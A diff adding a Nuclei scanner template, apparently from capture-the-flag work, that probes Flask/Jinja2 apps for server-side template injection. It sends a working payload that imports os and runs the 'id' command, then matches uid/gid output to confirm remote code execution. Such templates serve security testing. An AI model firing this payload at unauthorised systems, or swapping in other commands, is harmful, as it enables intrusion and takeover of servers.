@@ -1,0 +1,33 @@
+id: flask-ssti-id-rce-fuzz
+
+info:
+  name: Flask SSTI RCE (ID Command - Payload Mode)
+  author: jebeen
+  severity: critical
+  description: |
+    Detects SSTI RCE by injecting the payload using Nuclei's payload module.
+    Ref: Based on jinja2-oob template structure.
+  tags: ctf, ssti, rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "input=§ssti§"
+
+    payloads:
+      ssti:
+        - "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
+
+    attack: pitchfork
+    skip-variables-check: true
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=[0-9]+\(.+?\) gid=[0-9]+\(.+?\) groups=[0-9]+\(.+?\)'
